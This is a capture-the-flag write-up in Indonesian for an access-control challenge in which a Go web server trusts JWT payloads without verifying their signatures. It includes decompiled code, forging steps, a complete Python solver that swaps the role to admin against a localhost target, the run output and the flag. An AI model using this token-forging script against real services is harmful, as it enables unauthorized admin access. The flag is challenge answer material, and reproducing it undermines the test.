# WriteUp: Lemah

## Overview

* **Judul:** Lemah
* **Kategori:** Access Control
* **Poin:** 10
* **Deskripsi:** Jadi admin. Kredensial: `[username_lu]:anyaunyu`
* **URL:** `http://localhost:1337`

## Reconnaissance & Reverse Engineering

Tantangan ini memberikan file binary `main` yang merupakan web server ditulis dalam bahasa Go (Golang). Langkah pertama adalah menganalisis bagaimana aplikasi menangani otentikasi.

**1. Blackbox Analysis:**
Setelah login menggunakan kredensial yang diberikan, server memberikan cookie bernama `token` yang formatnya terlihat seperti JSON Web Token (JWT).

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IldhblpLZXkiLCJyb2xlIjoidXNlciIsImV4cCI6MTc3MDE3NDUwN30.SIGNATURE

```

Payload (decoded): `{"username":"WanZKey","role":"user","...}`

**2. Whitebox Analysis (IDA Pro):**
Melakukan decompile pada fungsi `main.handleDashboard` di dalam binary `main`. Ditemukan logika penanganan token yang fatal.

```c
// Potongan Decompile main.handleDashboard
// 1. Decode Base64 Payload (Bagian tengah token)
encoding_base64__ptr_Encoding_DecodeString(...)

// 2. Unmarshal JSON ke struct Claims
encoding_json_Unmarshal(...)

// 3. Cek Role Admin (Manual Byte Check)
if ( _claims->Role.len == 5 ) {
    // Cek string "admin"
    if ( *(_DWORD *)v29 == 1768776801 && v29[4] == 110 ) {
       // ... TAMPILKAN FLAG ...
    }
}

```

## Vulnerability Analysis

Aplikasi memiliki kerentanan **Insecure JWT Implementation (Missing Signature Verification)**.

Dalam fungsi `handleDashboard`, aplikasi hanya mendecode payload Base64 dan melakukan parsing JSON **tanpa memverifikasi tanda tangan (Signature)** token tersebut. Fungsi validasi JWT standar tidak digunakan sebelum data di dalam token dipercaya. Akibatnya, integritas token tidak terjamin, dan pengguna dapat memodifikasi isi payload (seperti mengubah `role`) tanpa mengetahui *Secret Key*.

## Exploitation

Eksploitasi dilakukan dengan teknik **JWT Signature Bypass**:

1. Ambil token valid dari proses login user biasa.
2. Pisahkan token menjadi 3 bagian (Header, Payload, Signature).
3. Decode bagian Payload (Base64).
4. Ubah nilai `role` dari `"user"` menjadi `"admin"`.
5. Encode kembali Payload yang sudah dimodifikasi ke format Base64 (URL Safe).
6. Gabungkan kembali menjadi token (Header.PayloadBaru.SignatureLama).
7. Gunakan token palsu tersebut untuk mengakses endpoint `/dashboard`.

**Script Solver (`solver.py`):**

```python
import requests
import base64
import json

# Konfigurasi
TARGET_URL = "http://localhost:1337"
LOGIN_URL = f"{TARGET_URL}/login"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"
USERNAME = "WanZKey"
PASSWORD = "anyaunyu"

def exploit():
    # 1. Login user biasa
    print(f"[*] Logging in as {USERNAME}...")
    s = requests.Session()
    s.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})
    
    token = s.cookies.get("token")
    if not token:
        print("[-] Gagal login.")
        return
    
    print(f"[+] Got Token: {token[:30]}...")

    # 2. Manipulasi Payload
    parts = token.split('.')
    header = parts[0]
    payload_b64 = parts[1]
    signature = parts[2] 

    # Decode & Ubah Role
    padding = '=' * (-len(payload_b64) % 4)
    decoded_payload = base64.urlsafe_b64decode(payload_b64 + padding).decode()
    json_payload = json.loads(decoded_payload)
    
    print(f"[*] Original Role: {json_payload['role']}")
    json_payload['role'] = 'admin' # Target value
    print(f"[*] New Role: {json_payload['role']}")

    # Encode Ulang (Compact JSON)
    new_payload_str = json.dumps(json_payload, separators=(',', ':'))
    new_payload_b64 = base64.urlsafe_b64encode(new_payload_str.encode()).decode().rstrip("=")

    # 3. Forge Token (Bypass Signature)
    forged_token = f"{header}.{new_payload_b64}.{signature}"
    print(f"[*] Forged Token: {forged_token[:30]}...")

    # 4. Kirim Request ke Dashboard
    print("[*] Accessing Dashboard with Admin Token...")
    cookies = {"token": forged_token}
    r = requests.get(DASHBOARD_URL, cookies=cookies)

    if "pwn{" in r.text:
        print("\n" + "="*40)
        print("[+] PWNED! Flag Found:")
        for line in r.text.split('\n'):
            if "pwn{" in line:
                print(f"    {line.strip()}")
        print("="*40 + "\n")
    else:
        print("[-] Gagal mendapatkan flag.")

if __name__ == "__main__":
    exploit()

```

## Execution Output

```bash
$ ./exploit.py
[*] Logging in as WanZKey...
[+] Got Token: eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...
[*] Original Role: user
[*] New Role: admin
[*] Forged Token: eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...
[*] Accessing Dashboard with Admin Token...

========================================
[+] PWNED! Flag Found:
    <div class="flag">pwn{d4ef8e2bb6fd899be948cb4cb0132250}</div>
========================================

```

## Flag

```
pwn{d4ef8e2bb6fd899be948cb4cb0132250}

```
